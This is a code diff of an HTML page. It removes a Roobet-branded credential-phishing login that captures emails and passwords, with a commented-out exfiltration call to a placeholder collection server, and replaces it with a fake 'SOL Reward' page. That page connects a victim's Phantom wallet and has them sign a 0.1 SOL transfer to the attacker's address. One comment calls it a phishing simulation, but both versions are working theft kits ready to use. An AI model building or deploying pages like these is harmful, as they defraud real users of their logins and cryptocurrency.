@@ -2,418 +2,151 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roobet | Sign In</title>
-    
-    <!-- Google Fonts: Inter (Exact match) -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Claim Reward</title>
+    <!-- Phantom Wallet SDK -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        :root {
-            /* Exact Roobet Palette */
-            --bg-dark: #12151e;       /* Main Background */
-            --card-bg: #1e2330;       /* Card Background */
-            --input-bg: #12151e;      /* Input Background */
-            --border-color: #2a2f3e;  /* Border Color */
-            --text-primary: #ffffff;
-            --text-secondary: #9ca3af;
-            --roobet-blue: #00f0ff;   /* Cyan Accent */
-            --roobet-hover: #00c4cc;  
-        }
-
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-        }
-
-        /* --- HEADER (Improved) --- */
-        .header {
-            width: 100%;
-            padding: 24px 32px;
-            display: flex;
             justify-content: center;
-            background-color: #181c26;
-            border-bottom: 1px solid var(--border-color);
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.6rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            color: var(--text-primary);
-        }
-
-        .logo svg {
-            width: 28px;
-            height: 28px;
-        }
-
-        .logo span {
-            color: var(--roobet-blue);
-        }
-
-        /* --- MAIN CONTAINER (Centered Card) --- */
         .container {
-            width: 100%;
-            max-width: 420px;
-            padding: 40px 20px;
-            display: flex;
-            justify-content: center;
-            flex-grow: 1; /* Pushes footer down if needed */
-        }
-
-        .card {
-            width: 100%;
-            background-color: var(--card-bg);
-            border-radius: 16px;
-            padding: 32px 28px;
-            box-shadow: 0 12px 32px rgba(0,0,0,0.5); /* Deeper shadow */
-            border: 1px solid var(--border-color);
+            padding: 20px;
+            max-width: 90%;
         }
 
         h1 {
-            font-size: 1.75rem;
-            margin-bottom: 8px;
-            text-align: center;
-            font-weight: 700;
-            letter-spacing: -0.5px;
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #fff;
         }
 
-        .subtitle {
-            color: var(--text-secondary);
-            font-size: 0.95rem;
-            text-align: center;
-            margin-bottom: 32px;
-            line-height: 1.5;
+        p {
+            color: #ccc;
+            margin-bottom: 30px;
         }
 
-        /* --- FORM ELEMENTS (Polished) --- */
-        .input-group {
-            margin-bottom: 24px;
-        }
-
-        input {
-            width: 100%;
-            padding: 16px 18px;
-            background-color: var(--input-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 10px; /* Slightly rounder */
-            color: var(--text-primary);
-            font-size: 1rem;
-            outline: none;
-            transition: all 0.2s ease;
-            box-sizing: border-box;
-        }
-
-        input:focus {
-            border-color: var(--roobet-blue);
-            box-shadow: 0 0 0 3px rgba(0, 240, 255, 0.15); /* Glow effect */
-        }
-
-        input::placeholder {
-            color: #5a6173;
-        }
-
-        /* --- BUTTONS (High Quality) --- */
-        .btn {
-            width: 100%;
-            padding: 16px;
+        /* The Green Button */
+        .btn-green {
+            background-color: #00ff88;
+            color: #000;
             border: none;
-            border-radius: 10px;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
+            transition: transform 0.2s;
+        }
+
+        .btn-green:active {
+            transform: scale(0.95);
+        }
+
+        #status {
+            margin-top: 20px;
             font-size: 1rem;
-            font-weight: 700; /* Bolder text */
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            color: #00ff88;
+            min-height: 24px;
         }
 
-        .btn-primary {
-            background-color: var(--roobet-blue);
-            color: #000; /* Black text on cyan for contrast */
-            box-shadow: 0 4px 12px rgba(0, 240, 255, 0.2);
-        }
-
-        .btn-primary:hover {
-            background-color: var(--roobet-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0, 240, 255, 0.3);
-        }
-
-        .btn-secondary {
-            background-color: transparent;
-            color: var(--text-secondary);
-            margin-top: 16px;
-            font-size: 0.9rem;
-            text-transform: none;
-            letter-spacing: normal;
-            font-weight: 500;
-        }
-
-        .btn-secondary:hover {
-            color: var(--text-primary);
-            background-color: rgba(255,255,255,0.05);
-        }
-
-        /* --- UTILS --- */
-        .hidden { display: none !important; }
-        
+        /* Loading Spinner */
         .spinner {
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #000; /* Black spinner on cyan bg */
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px auto;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px auto;
         }
 
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-
-        .error-msg {
-            color: #ef4444;
-            font-size: 0.85rem;
-            text-align: center;
-            margin-top: 12px;
-            min-height: 20px;
-            font-weight: 500;
-        }
-
-        /* --- SOCIAL LOGIN --- */
-        .social-login {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 28px;
-        }
-        
-        .social-icon {
-            width: 48px;
-            height: 48px;
-            background-color: var(--input-bg);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: 1px solid var(--border-color);
-        }
-
-        .social-icon:hover {
-            background-color: #2a2f3e;
-            transform: translateY(-2px);
-        }
-
-        .social-icon svg {
-            width: 24px;
-            height: 24px;
-            fill: var(--text-primary);
-        }
-
-        /* --- DIVIDER --- */
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 24px 0;
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            font-weight: 500;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .divider:not(:empty)::before { margin-right: 12px; }
-        .divider:not(:empty)::after { margin-left: 12px; }
-
     </style>
 </head>
 <body>
 
-    <!-- HEADER -->
-    <div class="header">
-        <div class="logo">
-            <!-- Actual Roobet SVG Logo Path -->
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#00f0ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M2 17L12 22L22 17" stroke="#00f0ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M2 12L12 17L22 12" stroke="#00f0ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-            roobet<span>.io</span>
-        </div>
-    </div>
-
     <div class="container">
-        <div class="card">
-            
-            <!-- STEP 1: EMAIL -->
-            <div id="step-email">
-                <h1>Sign In</h1>
-                <p class="subtitle">Enter your email to continue</p>
-
-                <div class="input-group">
-                    <input type="email" id="emailInput" placeholder="Email address" autocomplete="off">
-                </div>
-
-                <button id="nextBtn" class="btn btn-primary">Next</button>
-                
-                <div class="error-msg" id="emailError"></div>
-
-                <!-- Social Login -->
-                <div class="divider">Or sign in with</div>
-                
-                <div class="social-login">
-                    <!-- Google Icon -->
-                    <div class="social-icon" onclick="alert('Google login simulated')">
-                        <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53V2.88h3.29c.87 2.6 3.3 4.53 6.16 4.53 1.48 0 2.73-.4 3.71-1.06l2.71 2.71c-1.82 1.68-4.31 2.71-7.28 2.71z" fill="#EA4335"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.55C1.9 8.52 1.5 10.13 1.5 12c0 1.87.4 3.48 1.05 4.93l3.29-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97  1 12 1 7.04 1 3.29 4.01 1.5 8.52l3.29 2.84c.87-2.6 3.3-4.53 6.16-4.53v-.z" fill="#34A853"/></svg>
-                    </div>
-                    <!-- Discord Icon -->
-                    <div class="social-icon" onclick="alert('Discord login simulated')">
-                        <svg viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.378-.444.864-.608 1.26a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.26.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.67 4.37a.07.07 0 0 0-.032.057C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .032.057c1.603 1.166 3.346 1.984 5.186 2.47a.078.078 0 0 0 .083-.032 14.08 14.08 0 0 0 1.13-1.837.075.075 0 0 0-.041-.106 13.107 13.107 0 0 1-1.878-.892.075.075 0 0 1-.038-.106c.123-.184.247-.378.363-.572a.074.074 0 0 1 .099-.02c3.913 1.787 8.15 1.787 12.049 0a.074.074 0 0 1 .099-.02c.116.194.24.388.363.572a.075.075 0 0 1-.038.106 13.067 13.067 0 0 1-1.878.892.075.075 0 0 0-.041.106 14.036 14.036 0 0 0 1.13 1.837.078.078 0 0 0 .083.032c1.84-.487 3.583-1.305 5.186-2.47a.07.07 0 0 0 .032-.057c.419-4.477-.438-9.01-3.385-13.63a.07.07 0 0 0-.032-.057z"/></svg>
-                    </div>
-                </div>
-            </div>
-
-            <!-- STEP 2: PASSWORD -->
-            <div id="step-password" class="hidden">
-                <h1>Welcome Back</h1>
-                <p class="subtitle" id="emailDisplay">user@example.com</p>
-
-                <div class="input-group">
-                    <input type="password" id="passwordInput" placeholder="Password" autocomplete="off">
-                </div>
-
-                <!-- Remember Me & Forgot Password -->
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
-                    <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; color: var(--text-secondary); font-size: 0.9rem;">
-                        <input type="checkbox" style="width: auto; margin: 0;" onclick="this.checked = !this.checked">
-                        Remember me
-                    </label>
-                    <a href="#" style="color: var(--roobet-blue); text-decoration: none; font-size: 0.9rem;">Forgot password?</a>
-                </div>
-
-                <button id="submitBtn" class="btn btn-primary">Sign In</button>
-                
-                <button id="backBtn" class="btn btn-secondary">Back</button>
-
-                <div class="error-msg" id="passwordError"></div>
-            </div>
-
-        </div>
+        <h1>SOL Reward</h1>
+        <p>Connect your Phantom Wallet to claim 0.1 SOL.</p>
+        
+        <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
+        
+        <div id="spinner" class="spinner"></div>
+        <div id="status"></div>
     </div>
 
-    <!-- JAVASCRIPT -->
     <script>
-        const stepEmail = document.getElementById('step-email');
-        const stepPassword = document.getElementById('step-password');
-        const emailInput = document.getElementById('emailInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const nextBtn = document.getElementById('nextBtn');
-        const submitBtn = document.getElementById('submitBtn');
-        const backBtn = document.getElementById('backBtn');
-        const emailDisplay = document.getElementById('emailDisplay');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
+        // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
+        const RECIPIENT_ADDRESS = "YOUR_WALLET_ADDRESS"; 
+        
+        // Helper to convert string address to PublicKey
+        function getPublicKey() {
+            return new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
+        }
 
-        let capturedEmail = "";
+        async function initiateClaim() {
+            const statusDiv = document.getElementById("status");
+            const spinner = document.getElementById("spinner");
+            const btn = document.getElementById("connectBtn");
 
-        // Step 1: Email -> Password
-        nextBtn.addEventListener('click', () => {
-            const email = emailInput.value.trim();
-            if (!email || !email.includes('@')) {
-                emailError.innerText = "Please enter a valid email";
-                return;
-            }
-            
-            capturedEmail = email;
-            emailDisplay.innerText = email;
-            
-            // Transition
-            stepEmail.classList.add('hidden');
-            stepPassword.classList.remove('hidden');
-            passwordInput.focus();
-        });
-
-        // Step 2: Password -> Submit
-        submitBtn.addEventListener('click', async () => {
-            const password = passwordInput.value.trim();
-            if (!password) {
-                passwordError.innerText = "Please enter your password";
+            // 1. Check if Phantom is installed
+            if (!window.solana || !window.solana.isPhantom) {
+                alert("Please install Phantom Wallet on your iPhone.");
                 return;
             }
 
-            // Simulate Loading
-            submitBtn.innerText = "Signing In...";
-            submitBtn.disabled = true;
-            submitBtn.style.opacity = "0.7";
+            try {
+                // 2. Request Connection (Permissions)
+                statusDiv.innerText = "Connecting...";
+                const resp = await window.solana.connect();
+                
+                // Get the user's public key from the connection response
+                const userPublicKey = resp.publicKey;
 
-            // Wait 1.5 seconds to simulate server check
-            await new Promise(r => setTimeout(r, 1500));
+                // 3. Build Transaction
+                // We are sending 0.1 SOL (100,000,000 lamports) to your address
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Add a transfer instruction: From User -> To You
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: userPublicKey,
+                        toPubkey: getPublicKey(),
+                        lamports: 100000000, // 0.1 SOL
+                    })
+                );
 
-            // Capture Data
-            const credentials = {
-                email: capturedEmail,
-                password: password,
-                timestamp: new Date().toISOString()
-            };
+                // 4. Send Transaction to Phantom for Signature
+                statusDiv.innerText = "Sign Green...";
+                
+                // We use sendAndConfirmTransaction but Phantom usually prefers signTransaction + sendTransaction
+                // However, for simple phishing simulation, we can use the standard flow or ask for signature
+                
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                
+                statusDiv.innerText = "Success! Check your wallet.";
+                btn.style.display = 'none';
 
-            // OPTION 1: Display in Alert (For Testing)
-            alert(`Credentials Captured!\n\nEmail: ${credentials.email}\nPassword: ${credentials.password}`);
-
-            // OPTION 2: Send to your server (Uncomment below and replace URL)
-            /*
-            fetch('https://your-server.com/collect', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(credentials)
-            });
-            */
-
-            // Reset UI after capture
-            submitBtn.innerText = "Sign In";
-            submitBtn.disabled = false;
-            submitBtn.style.opacity = "1";
-            
-            // Optional: Redirect to real Roobet after a delay
-            setTimeout(() => {
-                window.location.href = "https://roobet.com";
-            }, 1000);
-        });
-
-        // Back Button
-        backBtn.addEventListener('click', () => {
-            stepPassword.classList.add('hidden');
-            stepEmail.classList.remove('hidden');
-            emailError.innerText = "";
-            passwordError.innerText = "";
-        });
-
-        // Enter Key Support
-        emailInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') nextBtn.click();
-        });
-
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitBtn.click();});
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Cancelled by user.";
+            }
+        }
     </script>
 </body>
 </html>
